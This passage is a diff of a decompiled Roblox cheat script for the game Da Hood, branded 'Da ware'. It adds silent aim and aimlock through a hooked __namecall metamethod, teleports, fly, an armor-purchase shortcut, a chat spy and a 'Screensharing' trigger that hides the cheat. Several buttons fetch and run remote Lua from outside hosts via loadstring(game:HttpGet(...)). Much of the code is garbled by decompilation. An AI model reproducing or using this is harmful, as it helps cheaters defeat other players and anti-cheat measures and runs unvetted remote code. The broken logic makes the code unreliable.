+      "UpperTorso",
+      "HumanoidRootPart",
+      "LowerTorso"
+    }, function(a)w
+      getgenv().AimPart = a
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Silent Aim"):NewSection("Da ware"):NewButton("Silent Aim", "Silent Aim Toggle Key is T.", function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/lemonsys/dahood/main/localsilentaim", true))()
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Silent Aim"):NewSection("Da ware"):NewTextBox("Silent Aim Prediction", "0.157 for low ping 0.165 for medium ping 0.178 for high ping", function(a)
+      DaHoodSettings.Prediction = a
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Silent Aim"):NewSection("Da ware"):NewDropdown("Silent Aim Part", "Choose Silent Aim Part", {
+      "Head",
+      "UpperTorso",
+      "HumanoidRootPart",
+      "LowerTorso"
+    }, function(a)
+      Aiming.TargetPart = a
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Silent Aim"):NewSection("Da ware"):NewTextBox("Silent Aim Fov", "Silent Aim Fov Changer", function(a)
+      Aiming.FOV = a
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Silent Aim"):NewSection("Da ware"):NewToggle("Silent Aim Show Fov", "yea", function(a)
+      Aiming.ShowFOV = a
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Silent Aimlock"):NewSection("Da ware"):NewButton("Silent Aimlock", "Key is Q.", function()
+      _G.KEY = "q"
+      _G.PART = "LowerTorso"
+      _G.PRED = 0.032
+      _G.Frame = Vector3.new(0, 0.53, 0)
+      function makemarker(a, b, c, d, e)
+        Instance.new("BillboardGui", a).Name = "PP"
+        Instance.new("BillboardGui", a).Adornee = b
+        Instance.new("BillboardGui", a).Size = UDim2.new(d, e, d, e)
+        Instance.new("BillboardGui", a).AlwaysOnTop = true
+        Instance.new("Frame", (Instance.new("BillboardGui", a))).Size = UDim2.new(4, 0, 4, 0)
+        Instance.new("Frame", (Instance.new("BillboardGui", a))).BackgroundTransparency = 0.1
+        Instance.new("Frame", (Instance.new("BillboardGui", a))).BackgroundColor3 = c
+        Instance.new("UICorner", (Instance.new("Frame", (Instance.new("BillboardGui", a))))).CornerRadius = UDim.new(50, 50)
+        return (Instance.new("BillboardGui", a))
+      end
+      function noob(a)
+        repeat
+          wait()
+        until a.Character
+        makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0).Name = a.Name
+        a.CharacterAdded:connect(function(a)
+          va.Adornee = a:WaitForChild(_G.PART)
+        end)
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).BackgroundTransparency = 1
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).Position = UDim2.new(0, 0, 0, -50)
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).Size = UDim2.new(0, 100, 0, 100)
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).Font = Enum.Font.SourceSansSemibold
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).TextSize = 14
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).TextColor3 = Color3.new(1, 1, 1)
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).TextStrokeTransparency = 0
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).TextYAlignment = Enum.TextYAlignment.Bottom
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).Text = "Name: " .. a.Name
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).ZIndex = 10
+        spawn(function()
+          repeat
+          until not wait() or nil
+        end)
+      end
+      for fo = 1, #game.Players:GetPlayers() do
+        if game.Players:GetPlayers()[fo] ~= game.Players.LocalPlayer then
+          noob(game.Players:GetPlayers()[fo])
+        end
+      end
+      game.Players.PlayerAdded:connect(function(a)
+        noob(a)
+      end)
+      game.Players.PlayerRemoving:Connect(function(a)
+        va[a.Name]:Destroy()
+      end)
+      spawn(function()
+        va.Anchored = true
+        va.CanCollide = false
+        va.Size = Vector3.new(0.1, 0.1, 0.1)
+        va.Transparency = 0.1
+        makemarker(va, va, Color3.fromRGB(255, 0, 0), 0.2, 0)
+      end)
+      game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(a)
+        if a ~= _G.KEY then
+          return
+        end
+        if va then
+          va = false
+          vb.TextColor3 = Color3.fromRGB(255, 20, 75)
+          vb.Text = "------"
+        else
+          va = true
+          vc = getClosestPlayerToCursor()
+          vb.TextColor3 = Color3.fromRGB(12, 255, 0)
+          vb.Text = vc.Character.Humanoid.DisplayName
+        end
+      end)
+      function getClosestPlayerToCursor()
+        for fg, fh in pairs(game.Players:GetPlayers()) do
+          if fh ~= game.Players.LocalPlayer and not math.huge and fh.Character:FindFirstChild("Humanoid") and fh.Character.Humanoid.Health ~= 0 and not math.huge and math.huge > Vector2.new(va:WorldToViewportPoint(fh.Character.PrimaryPart.Position).X, va:WorldToViewportPoint(fh.Character.PrimaryPart.Position).Y) - Vector2.new(vb.X, vb.Y).magnitude then
+          end
+        end
+        return fh
+      end
+      game:GetService("RunService").Stepped:connect(function()
+        if not nil and vb.Character and vb.Character:FindFirstChild(_G.PART) then
+          vc.CFrame = CFrame.new(2 + 3)
+        else
+          vc.CFrame = CFrame.new(0, 9999, 0)
+        end
+      end)
+      setreadonly(getrawmetatable(game), false)
+      getrawmetatable(game).__namecall = newcclosure(function()
+        if not {
+          ...
+        } and getnamecallmethod() == "FireServer" and {
+          ...
+        }[2] == "UpdateMousePos" then
+          return vd(unpack({
+            ...
+          }))
+        end
+        return vd(...)
+      end)
+      game.Players.LocalPlayer.Chatted:Connect(function(a)
+        if a == "/e print" then
+          print(_G.PRED)
+        end
+      end)
+      game.Players.LocalPlayer.Chatted:Connect(function(a)
+        if a == "Code:1029" then
+          _G.KEY = nil
+          _G.AIR = nil
+          _G.PART = nil
+          _G.PRED = nil
+          va.Visible = false
+        end
+      end)
+      game.Players.LocalPlayer.Chatted:Connect(function(a)
+        if a == "/e hrp" then
+          _G.KEY = "q"
+          _G.AIR = 5E-05
+          _G.PART = "HumanoidRootPart"
+          _G.PRED = 0.032
+          va.Visible = true
+        end
+      end)
+      game.Players.LocalPlayer.Chatted:Connect(function(a)
+        if a == "/e lt" then
+          _G.KEY = "q"
+          _G.AIR = 5E-05
+          _G.PART = "LowerTorso"
+          _G.PRED = 0.032
+          va.Visible = true
+        end
+      end)
+      game.Players.LocalPlayer.Chatted:Connect(function(a)
+        if a == "Screensharing" then
+          _G.KEY = "q"
+          _G.AIR = 5E-05
+          _G.PART = "LowerTorso"
+          _G.PRED = 0.033
+          va.Visible = true
+          vb = nil
+        end
+      end)
+      game.Players.LocalPlayer.Chatted:Connect(function(a)
+        if a == "/e P+" then
+          _G.PRED = 2 + 0.001
+        end
+      end)
+      game.Players.LocalPlayer.Chatted:Connect(function(a)
+        if a == "/e P-" then
+          _G.PRED = _G.PRED - 0.001
+        end
+      end)
+      while wait() do
+        if getClosestPlayerToCursor().Character.Humanoid.Jump == true and getClosestPlayerToCursor().Character.Humanoid.FloorMaterial == Enum.Material.Air then
+          _G.Frame = Vector3.new(0, -2.3, 0)
+          wait(0.05)
+        else
+          _G.Frame = Vector3.new(0, 0.53, 0)
+        end
+      end
+    end)
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1087.02783, 104.254997, -268.160614, 0.0359299146, -0.000130457382, -0.99935472, -2.87694893E-05, 1, -0.000131575929, 0.99935472, 3.34783836E-05, 0.0359299146)
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-634.463135, 80.434761, -204.232559, -0.0190527271, -1.03574322E-07, -0.999818563, 4.36709335E-09, 1, -1.03676342E-07, 0.999818563, -6.3416179E-09, -0.0190527271)
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-729.895, -37.642, -885.8)
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(112.622, -26.212, -277.321)
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-318.891174, 80.2145309, -257.177429, 0.0479469746, -5.14644114E-08, 0.998850107, -3.12971538E-09, 1, 5.16738901E-08, -0.998850107, -5.60372015E-09, 0.0479469746)
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://gitlab.com/Tsuniox/lua-stuff/-/raw/master/R15GUI.lua"))()
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    repeat
+      wait()
+    until game.Players.LocalPlayer and not nil and game.Players.LocalPlayer.Character:findFirstChild("Head") and not game.Players.LocalPlayer.Character
+    repeat
+      wait()
+    until not wait
+    function Fly()
+      Instance.new("BodyGyro", va).P = 90000
+      Instance.new("BodyGyro", va).maxTorque = Vector3.new(9000000000, 9000000000, 9000000000)
+      Instance.new("BodyGyro", va).cframe = va.CFrame
+      Instance.new("BodyVelocity", va).velocity = Vector3.new(0, 0.1, 0)
+      Instance.new("BodyVelocity", va).maxForce = Vector3.new(9000000000, 9000000000, 9000000000)
+      repeat
+        wait()
+        vb.Character.Humanoid.PlatformStand = true
+        if 2 + 3 ~= 0 or 2 + 3 ~= 0 then
+          vd = 2 + 3
+          if vd >= ve then
+            vd = ve
+          end
+        elseif 2 + 3 == 0 and 2 + 3 == 0 and vd ~= 0 then
+          vd = vd - 1
+          if vd < 0 then
+            vd = 0
+          end
+        end
+        if 2 + 3 ~= 0 or 2 + 3 ~= 0 then
+          Instance.new("BodyVelocity", va).velocity = (2 + 3) * vd
+          vg = {
+            f = vc.f,
+            b = vc.b,
+            l = vc.l,
+            r = vc.r
+          }
+        elseif 2 + 3 == 0 and 2 + 3 == 0 and vd ~= 0 then
+          Instance.new("BodyVelocity", va).velocity = (2 + 3) * vd
+        else
+          Instance.new("BodyVelocity", va).velocity = Vector3.new(0, 0.1, 0)
+        end
+        Instance.new("BodyGyro", va).cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((5 + 6) * 50 * vd / ve), 0, 0)
+      until not vh
+      vc = {
+        f = 0,
+        b = 0,
+        l = 0,
+        r = 0
+      }
+      vg = {
+        f = 0,
+        b = 0,
+        l = 0,
+        r = 0
+      }
+      vd = 0
+      Instance.new("BodyGyro", va):Destroy()
+      Instance.new("BodyVelocity", va):Destroy()
+      vb.Character.Humanoid.PlatformStand = false
+    end
+    game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(a)
+      if a:lower() == "x" then
+        if va then
+          va = false
+        else
+          va = true
+          Fly()
+        end
+      elseif a:lower() == "w" then
+        vb.f = 1
+      elseif a:lower() == "s" then
+        vb.b = -1
+      elseif a:lower() == "a" then
+        vb.l = -1
+      elseif a:lower() == "d" then
+        vb.r = 1
+      end
+    end)
+    game.Players.LocalPlayer:GetMouse().KeyUp:connect(function(a)
+      if a:lower() == "w" then
+        va.f = 0
+      elseif a:lower() == "s" then
+        va.b = 0
+      elseif a:lower() == "a" then
+        va.l = 0
+      elseif a:lower() == "d" then
+        va.r = 0
+      end
+    end)
+    Fly()
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-938.476685, -25.2498264, 570.100159, -0.0353576206, 9.85617206E-08, -0.999374807, -2.69198441E-09, 1, 9.871858E-08, 0.999374807, 6.18077589E-09, -0.0353576206)
+    wait(0.2)
+    fireclickdetector(game.Workspace.Ignored.Shop["[High-Medium Armor] - $2300"].ClickDetector)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(707.502014, 139, -543.044739, -0.00318608154, -0.00102963799, 0.999993861, 0.000187970581, 0.999999464, 0.00103024102, -0.99999404, 0.00019125198, -0.00318560796)
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    _G.KEY = "q"
+    _G.PART = "HumanoidRootPart"
+    _G.PRED = 0.057
+    _G.Frame = Vector3.new(0, 0.53, 0)
+    function makemarker(a, b, c, d, e)
+      Instance.new("BillboardGui", a).Name = "PP"
+      Instance.new("BillboardGui", a).Adornee = b
+      Instance.new("BillboardGui", a).Size = UDim2.new(d, e, d, e)
+      Instance.new("BillboardGui", a).AlwaysOnTop = true
+      Instance.new("Frame", (Instance.new("BillboardGui", a))).Size = UDim2.new(4, 0, 4, 0)
+      Instance.new("Frame", (Instance.new("BillboardGui", a))).BackgroundTransparency = 0.1
+      Instance.new("Frame", (Instance.new("BillboardGui", a))).BackgroundColor3 = c
+      Instance.new("UICorner", (Instance.new("Frame", (Instance.new("BillboardGui", a))))).CornerRadius = UDim.new(50, 50)
+      return (Instance.new("BillboardGui", a))
+    end
+    function noob(a)
+      repeat
+        wait()
+      until a.Character
+      makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0).Name = a.Name
+      a.CharacterAdded:connect(function(a)
+        va.Adornee = a:WaitForChild(_G.PART)
+      end)
+      Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).BackgroundTransparency = 1
+      Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).Position = UDim2.new(0, 0, 0, -50)
+      Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).Size = UDim2.new(0, 100, 0, 100)
+      Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).Font = Enum.Font.SourceSansSemibold
+      Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).TextSize = 14
+      Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).TextColor3 = Color3.new(1, 1, 1)
+      Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).TextStrokeTransparency = 0
+      Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).TextYAlignment = Enum.TextYAlignment.Bottom
+      Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).Text = "Bling" .. a.Name
+      Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).ZIndex = 10
+      spawn(function()
+        repeat
+        until not wait() or nil
+      end)
+    end
+    for fo = 1, #game.Players:GetPlayers() do
+      if game.Players:GetPlayers()[fo] ~= game.Players.LocalPlayer then
+        noob(game.Players:GetPlayers()[fo])
+      end
+    end
+    game.Players.PlayerAdded:connect(function(a)
+      noob(a)
+    end)
+    game.Players.PlayerRemoving:Connect(function(a)
+      va[a.Name]:Destroy()
+    end)
+    spawn(function()
+      va.Anchored = true
+      va.CanCollide = false
+      va.Size = Vector3.new(0.1, 0.1, 0.1)
+      va.Transparency = 0.1
+      makemarker(va, va, Color3.fromRGB(0, 180, 0), 0.2, 0)
+    end)
+    game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(a)
+      if a ~= _G.KEY then
+        return
+      end
+      if va then
+        va = false
+        vb.TextColor3 = Color3.fromRGB(255, 20, 75)
+        vb.Text = "------"
+      else
+        va = true
+        vc = getClosestPlayerToCursor()
+        vb.TextColor3 = Color3.fromRGB(12, 255, 0)
+        vb.Text = vc.Character.Humanoid.DisplayName
+      end
+    end)
+    function getClosestPlayerToCursor()
+      for fg, fh in pairs(game.Players:GetPlayers()) do
+        if fh ~= game.Players.LocalPlayer and not math.huge and not math.huge and fh.Character.Humanoid.Health ~= 0 and not math.huge and math.huge > Vector2.new(va:WorldToViewportPoint(fh.Character.PrimaryPart.Position).X, va:WorldToViewportPoint(fh.Character.PrimaryPart.Position).Y) - Vector2.new(vb.X, vb.Y).magnitude then
+        end
+      end
+      return fh
+    end
+    game:GetService("RunService").Stepped:connect(function()
+      if not nil and vb.Character and not vb.Character then
+        vc.CFrame = CFrame.new(2 + 3)
+      else
+        vc.CFrame = CFrame.new(0, 9999, 0)
+      end
+    end)
+    setreadonly(getrawmetatable(game), false)
+    getrawmetatable(game).__namecall = newcclosure(function()
+      if va and getnamecallmethod() == "FireServer" and {
+        ...
+      }[2] == "UpdateMousePos" then
+        return vd(unpack({
+          ...
+        }))
+      end
+      return vd(...)
+    end)
+    game.Players.LocalPlayer.Chatted:Connect(function(a)
+      if a == "/e print" then
+        print(_G.PRED)
+      end
+    end)
+    game.Players.LocalPlayer.Chatted:Connect(function(a)
+      if a == "Code:1029" then
+        _G.KEY = nil
+        _G.AIR = nil
+        _G.PART = nil
+        _G.PRED = nil
+        va.Visible = false
+      end
+    end)
+    game.Players.LocalPlayer.Chatted:Connect(function(a)
+      if a == "/e hrp" then
+        _G.KEY = "q"
+        _G.AIR = 5E-05
+        _G.PART = "HumanoidRootPart"
+        _G.PRED = 0.032
+        va.Visible = true
+      end
+    end)
+    game.Players.LocalPlayer.Chatted:Connect(function(a)
+      if a == "/e lt" then
+        _G.KEY = "q"
+        _G.AIR = 5E-05
+        _G.PART = "LowerTorso"
+        _G.PRED = 0.032
+        va.Visible = true
+      end
+    end)
+    game.Players.LocalPlayer.Chatted:Connect(function(a)
+      if a == "Screensharing" then
+        _G.KEY = "q"
+        _G.AIR = 5E-05
+        _G.PART = "LowerTorso"
+        _G.PRED = 0.033
+        va.Visible = true
+        vb = nil
+      end
+    end)
+    game.Players.LocalPlayer.Chatted:Connect(function(a)
+      if a == "/e P+" then
+        _G.PRED = 2 + 0.001
+      end
+    end)
+    game.Players.LocalPlayer.Chatted:Connect(function(a)
+      if a == "/e P-" then
+        _G.PRED = _G.PRED - 0.001
+      end
+    end)
+    while not nil do
+      if getClosestPlayerToCursor().Character.Humanoid.Jump == true and getClosestPlayerToCursor().Character.Humanoid.FloorMaterial == Enum.Material.Air then
+        _G.Frame = Vector3.new(0, -2.3, 0)
+        wait(0.05)
+      else
+        _G.Frame = Vector3.new(0, 0.53, 0)
+      end
+    end
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    function zeezyFrontflip(a, b, c)
+      if b == Enum.UserInputState.Begin then
+        va.Character.Humanoid:ChangeState("Jumping")
+        wait()
+        va.Character.Humanoid.Sit = true
+        for fh = 1, 360 do
+          delay(fh / 720, function()
+            va.Character.Humanoid.Sit = true
+            va.Character.HumanoidRootPart.CFrame = va.Character.HumanoidRootPart.CFrame * CFrame.Angles(-vb, 0, 0)
+          end)
+        end
+        wait(0.55)
+        va.Character.Humanoid.Sit = false
+      end
+    end
+    function zeezyBackflip(a, b, c)
+      if b == Enum.UserInputState.Begin then
+        va.Character.Humanoid:ChangeState("Jumping")
+        wait()
+        va.Character.Humanoid.Sit = true
+        for fh = 1, 360 do
+          delay(fh / 720, function()
+            va.Character.Humanoid.Sit = true
+            va.Character.HumanoidRootPart.CFrame = va.Character.HumanoidRootPart.CFrame * CFrame.Angles(vb, 0, 0)
+          end)
+        end
+        wait(0.55)
+        va.Character.Humanoid.Sit = false
+      end
+    end
+    function zeezyAirjump(a, b, c)
+      if b == Enum.UserInputState.Begin then
+        va.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Seated")
+        wait()
+        va.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
+      end
+    end
+    game:GetService("ContextActionService"):BindAction("Masonfrontflip", zeezyFrontflip, false, Enum.KeyCode.Z)
+    game:GetService("ContextActionService"):BindAction("MasonBackflip", zeezyBackflip, false, Enum.KeyCode.X)
+    game:GetService("ContextActionService"):BindAction("MasonAirjump", zeezyAirjump, false, Enum.KeyCode.C)
+    print("feFlip" .. " " .. "2.00" .. " loaded successfully")
+    print("Made by Mason?#4521")
+    Instance.new("Sound", workspace).PlaybackSpeed = 1.5
+    Instance.new("Sound", workspace).Volume = 0.15
+    Instance.new("Sound", workspace).SoundId = "rbxassetid://170765130"
+    Instance.new("Sound", workspace).PlayOnRemove = true
+    Instance.new("Sound", workspace):Destroy()
+    game.StarterGui:SetCore("SendNotification", {
+      Title = "feFlip Made By Mason?#4521",
+      Text = "feFlip loaded successfully!",
+      Icon = "rbxassetid://505845268",
+      Duration = 5,
+      Button1 = "Okay"
+    })
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-228.709259, 96.75, -46.1524429, 0.988781095, -6.16038989E-08, -0.149372295, 5.44428751E-08, 1, -5.20298862E-08, 0.149372295, 4.33139249E-08, 0.988781095)
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    workspace.CurrentCamera.FieldOfView = 120
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    workspace.CurrentCamera.FieldOfView = 90
+  end)
+end)()
+coroutine.wrap(function()
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    workspace.CurrentCamera.FieldOfView = 180
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    workspace.CurrentCamera.FieldOfView = 70
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    workspace.CurrentCamera.FieldOfView = 50
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    function GetCharacter()
+      return game.Players.LocalPlayer.Character
+    end
+    function Teleport(a)
+      if not a then
+        GetCharacter():MoveTo(a)
+      end
+    end
+    game:GetService("UserInputService").InputBegan:Connect(function(a)
+      if a.UserInputType == Enum.UserInputType.MouseButton1 and not a then
+        Teleport(vb.Hit.p)
+      end
+    end)
+    clicktp.Text = "Loaded!"
+    clicktp.TextColor3 = Color3.fromRGB(0, 255, 50)
+    wait(2)
+    clicktp.TextColor3 = Color3.fromRGB(0, 0, 0)
+    clicktp.Text = "Click TP"
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    wait(0)
+    game.StarterGui:SetCore("SendNotification", {
+      Title = "hold t and click your left mouse button",
+      Text = "where ever your mouse is it goes",
+      icon = "http://www.roblox.com/asset/?id=8109580830",
+      Duration = "5"
+    })
+  end)
+end)()
+coroutine.wrap(function()
+end)()
+coroutine.wrap(function()
+  setclipboard("https://discord.gg/9NZE47W5j8")
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.Image = game:GetService("Players"):GetUserThumbnailAsync(game:GetService("Players").LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+  Instance.new("LocalScript", va).Parent.Size = UDim2.new(0, 120, 0, 120)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.Text = "Hello! " .. game.Players.LocalPlayer.Name .. ". Join discord for key! (copied)"
+end)()
+coroutine.wrap(function()
+  while true do
+    game:GetService("TweenService"):Create(Instance.new("Script", va).Parent:WaitForChild("UIGradient"), TweenInfo.new(2, Enum.EasingStyle.Linear), {
+      Offset = Vector2.new(-1, 0)
+    }):Play()
+    wait(2)
+    Instance.new("Script", va).Parent:WaitForChild("UIGradient").Offset = Vector2.new(1, 0)
+    game:GetService("TweenService"):Create(Instance.new("Script", va).Parent:WaitForChild("UIGradient"), TweenInfo.new(2, Enum.EasingStyle.Linear), {
+      Offset = Vector2.new(0, 0)
+    }):Play()
+    wait(2)
+  end
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    if va.Parent.Parent.TextBox.Text == "Skidded" then
+      va.Parent.Parent.Visible = false
+      va.Parent.Parent.Parent.Main.Visible = true
+    end
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.InputBegan:Connect(function(a)
+    if a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch then
+      va = true
+      vb = a.Position
+      vc = vd.Position
+      a.Changed:Connect(function()
+        if va.UserInputState == Enum.UserInputState.End then
+          vb = false
+        end
+      end)
+    end
+  end)
+  game:GetService("UserInputService").InputChanged:Connect(function(a)
+    if (a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch) and not a then
+      vb(a)
+    end
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    if va.Parent.Parent.TextBox.Text == "Dawareontop" then
+      va.Parent.Parent.Visible = false
+      va.Parent.Parent.Parent.DHMGUI.Visible = true
+    end
+  end)
+end)()
+coroutine.wrap(function()
+end)()
+coroutine.wrap(function()
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.InputBegan:Connect(function(a)
+    if a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch then
+      va = true
+      vb = a.Position
+      vc = vd.Position
+      a.Changed:Connect(function()
+        if va.UserInputState == Enum.UserInputState.End then
+          vb = false
+        end
+      end)
+    end
+  end)
+  game:GetService("UserInputService").InputChanged:Connect(function(a)
+    if (a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch) and va then
+      vb(a)
+    end
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Down:connect(function()
+    va.Parent.Parent.Maintab.Visible = false
+    va.Parent.Parent.PlayerTab.Visible = true
+    va.Parent.Parent.VisualsTab.Visible = false
+    va.Parent.Parent.AimlocksTab.Visible = false
+    va.Parent.Parent.BoomboxTab.Visible = false
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/angeloX041/GASV1.5/main/GA%24V1.5 ", true))()
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    enabled = true
+    spyOnMyself = true
+    public = false
+    publicItalics = true
+    privateProperties = {
+      Color = Color3.fromRGB(0, 255, 255),
+      Font = Enum.Font.SourceSansBold,
+      TextSize = 18
+    }
+    _G.chatSpyInstance = 5 + 1
+    for fm, fo in ipairs(game:GetService("Players"):GetPlayers()) do
+      fo.Chatted:Connect(function(a)
+        va(vb, a)
+      end)
+    end
+    game:GetService("Players").PlayerAdded:Connect(function(a)
+      a.Chatted:Connect(function(a)
+        va(vb, a)
+      end)
+    end)
+    privateProperties.Text = "{SPY " .. (enabled and "DIS") .. "ABLED}"
+    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", privateProperties)
